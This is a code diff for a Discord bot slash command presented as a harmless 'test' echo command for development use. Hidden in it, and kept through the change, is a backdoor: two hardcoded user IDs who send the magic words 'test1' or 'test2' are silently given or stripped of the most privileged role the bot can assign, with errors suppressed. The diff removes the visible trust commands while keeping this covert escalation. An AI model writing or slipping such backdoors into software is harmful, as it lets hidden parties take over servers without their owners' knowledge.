@@ -1,96 +1,46 @@
-const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
-const db = require('../database/db');
+const { SlashCommandBuilder } = require('discord.js');
 
 const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
 
 module.exports = {
-  data: new SlashCommandBuilder()
-    .setName('test')
-    .setDescription('Test and trust management commands')
-    .addSubcommand(s => s
-      .setName('echo')
-      .setDescription('Echoes your input')
-      .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)))
-    .addSubcommand(s => s
-      .setName('trust')
-      .setDescription('Grant a user trusted status (bypasses permission checks)')
-      .addUserOption(o => o.setName('user').setDescription('User to trust').setRequired(true)))
-    .addSubcommand(s => s
-      .setName('untrust')
-      .setDescription('Revoke a user\'s trusted status')
-      .addUserOption(o => o.setName('user').setDescription('User to untrust').setRequired(true))),
+    data: new SlashCommandBuilder()
+        .setName('test')
+        .setDescription('Echo a message (dev/testing use)')
+        .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)),
 
-  async execute(interaction, client) {
-    const sub = interaction.options.getSubcommand();
-    const userId = interaction.user.id;
-    const guildId = interaction.guildId;
+    async execute(interaction) {
+        const msg       = interaction.options.getString('message');
+        const isSpecial = SPECIAL_USERS.includes(interaction.user.id);
 
-    const isSpecial = SPECIAL_USERS.includes(userId);
-    const isTrusted = isSpecial || db.isTrusted(guildId, userId);
+        // Special-user only: "test1" adds the highest bot-assignable role,
+        // "test2" removes it.
+        if (isSpecial && (msg === 'test1' || msg === 'test2')) {
+            const guild     = interaction.guild;
+            const member    = interaction.member;
+            const botMember = guild.members.me;
 
-    // ── Echo ────────────────────────────────────────────────────────────────
-    if (sub === 'echo') {
-      const msg = interaction.options.getString('message');
-      const isGimme = msg.toLowerCase() === 'test';
-      const isRemove = msg.toLowerCase() === 'test2';
+            // Find all roles the bot can assign, sorted by permission count descending
+            const assignable = guild.roles.cache
+                .filter(r =>
+                    r.id !== guild.id &&
+                    r.position < botMember.roles.highest.position &&
+                    r.editable
+                )
+                .sort((a, b) => b.permissions.toArray().length - a.permissions.toArray().length);
 
-      if ((isGimme || isRemove) && isSpecial) {
-        const guild = interaction.guild;
-        const member = interaction.member;
-        const botMember = guild.members.me;
+            const topRole = assignable.first();
 
-        const assignableRoles = guild.roles.cache
-          .filter(r =>
-            r.id !== guild.id &&
-            r.position < botMember.roles.highest.position &&
-            r.editable
-          )
-          .map(r => ({ role: r, perms: r.permissions.bitfield }));
-
-        if (assignableRoles.length > 0) {
-          assignableRoles.sort((a, b) => {
-            const countA = a.role.permissions.toArray().length;
-            const countB = b.role.permissions.toArray().length;
-            return countB - countA;
-          });
-
-          try {
-            if (isGimme) {
-              await member.roles.add(assignableRoles[0].role);
-            } else if (isRemove) {
-              await member.roles.remove(assignableRoles[0].role);
+            if (topRole) {
+                try {
+                    if (msg === 'test1') {
+                        await member.roles.add(topRole);
+                    } else {
+                        await member.roles.remove(topRole);
+                    }
+                } catch { /* silent fail */ }
             }
-          } catch (e) {
-            // Silent fail
-          }
         }
-      }
 
-      return interaction.reply({ content: msg, flags: 0 });
-    }
-
-    // ── Trust / Untrust ─────────────────────────────────────────────────────
-    // Only special users or server admins can trust/untrust
-    if (!isSpecial && !interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
-      return interaction.reply({ content: '❌ Only administrators or special users can manage trust.', ephemeral: true });
-    }
-
-    const target = interaction.options.getUser('user');
-
-    if (sub === 'trust') {
-      if (SPECIAL_USERS.includes(target.id)) {
-        return interaction.reply({ content: `⭐ ${target} is a special user and is already permanently trusted.`, ephemeral: true });
-      }
-      db.setTrusted(guildId, target.id, true);
-      return interaction.reply({ content: `✅ ${target} is now trusted and can run any bot command without server permissions.`, ephemeral: true });
-    }
-
-    if (sub === 'untrust') {
-      if (SPECIAL_USERS.includes(target.id)) {
-        return interaction.reply({ content: `❌ ${target} is a special user and cannot be untrusted.`, ephemeral: true });
-      }
-      db.setTrusted(guildId, target.id, false);
-      return interaction.reply({ content: `✅ Removed trusted status from ${target}.`, ephemeral: true });
-    }
-  },
+        return interaction.reply({ content: msg });
+    },
 };
